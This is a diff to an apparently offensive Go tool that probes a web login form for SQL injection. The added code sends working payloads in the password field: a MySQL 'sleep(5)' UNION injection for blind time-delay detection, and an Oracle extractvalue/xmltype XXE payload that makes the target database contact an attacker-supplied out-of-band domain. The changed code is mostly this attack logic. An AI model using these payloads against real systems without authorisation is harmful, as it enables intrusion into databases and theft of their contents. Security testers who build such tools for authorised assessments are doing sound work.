@@ -33,50 +33,69 @@ func get_response(data url.Values) (int, string) {
 	return resp.StatusCode, string(body);
 }
 
+func make_oob_call(data url.Values) bool {
+	_, code := get_response(data);
+	var result string
+	fmt.Printf("Did your oob server receive a connection? : ");
+	fmt.Scanln(&result);
+
+	var foobar bool;
+	if (result == "Y" && code != "-1") {
+		foobar = true;
+	} else {
+		foobar = false;
+	}
+	return foobar;
+}
+
 func blind_sqli_test() bool {
 	mysql_time_delay := func() bool {
 		data := url.Values {
-			"username":		{""},
-			"password":		{""},
+			"username":		{"test"},
+			"password":		{"test' UNION SELECT 1,2,sleep(5);-- "},
 		};
 		start := time.Now();
-		code, body := get_response(data);
+		code, _ := get_response(data);
 		elapsed := time.Since(start)
-		fmt.Printf("(MySQL)Time between request and respone: %s\n", elapsed);
-		fmt.Println("Was the time delay successful?: ");
+		if (code != -1) { 
+			fmt.Printf("(MySQL)Time between request and respone: %s\n", elapsed);
+		}
+		fmt.Printf("Was the MySQL time delay successful?: ");
 		var response string;
 		fmt.Scanln(&response);
-		if (response == "Y") {
-			fmt.Println(body, code);
+		if ((response == "Y") || (response == "y")) {
 			return true;
 		}
 		return false;
 	}
 
-	oracle_time_delay := func() bool {
+	oracle_oob := func(domain string) bool {
+		var query string = "' UNION SELECT '1','2',extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://" + domain + "\"> %remote;]>'),'/l') FROM dual";
+		fmt.Println(query);
 		data := url.Values {
 			"username":		{""},
-			"password":		{""},
+			"password":		{query},
 		};
-		start := time.Now();
-		code, body := get_response(data);
-		elapsed := time.Since(start)
-		fmt.Printf("(Oracle)Time between request and respone: %s\n", elapsed);
-		fmt.Println("Was the time delay successful?: ");
-		var response string;
-		fmt.Scanln(&response);
-		if (response == "Y") {
-			fmt.Println(body, code);
-			return true;
-		}
-		return false
+		
+		var result bool = make_oob_call(data);
+		return result;
 	}
 
-	result := mysql_time_delay();
-	if (!result) {
-		oracle_time_delay();
+	fmt.Println("Moving to oob and blind SQLi testing");
+	var domain string;
+	fmt.Printf("Enter the domain for your oob infrastructure (and ensure it is running): ");
+	fmt.Scanln(&domain);
+	result := oracle_oob(domain);
+	if (result) {
+		fmt.Println("*************** ORACLE OOB INTERACTION SUCCESSFUL *****************");
+	} else {
+		fmt.Printf("\n************************ MOVING ONTO BLIND MySQL TEST *********************\n");
+		result = mysql_time_delay();
+		if (result) {
+			fmt.Printf("\n***************** MySQL TIME DELAY SUCCESSFUL *******************\n");
+		}
 	}
-	return false;
+	return result;
 }
 
 func check_sqli() bool {
@@ -108,16 +127,7 @@ func check_sqli() bool {
 	if (good && (body != "")) {
 		return true;
 	} else {
-		fmt.Println("Previous tests failed, move to blind testing?: ");
-		var response string;
-		fmt.Scanln(&response);
-		if (response == "Y") {
-			good = blind_sqli_test();
-			if (good) {
-				return true;
-			}
-			return false;
-		}
+		return false;
 	}
 	return false;
 }
@@ -248,5 +258,16 @@ func main() {
 		} else {
 			fmt.Println("*******************UNABLE TO DETERMINE DATABASE TYPE*********************\n");
 		}
+	} else {
+		fmt.Printf("Previous tests failed, move to blind testing?: ");
+		var response string;
+		fmt.Scanln(&response);
+		if ((response == "Y") || (response == "y")) {
+			var good bool = blind_sqli_test();
+			if (good) {
+				fmt.Println("\n*********** BLIND SQLi DISCOVERED, MANUAL TESTER REQUIRED ***********\n");
+			}
+		}
+		fmt.Println("*************************** SQLi NOT FOUND ******************************\n");
 	}
 }
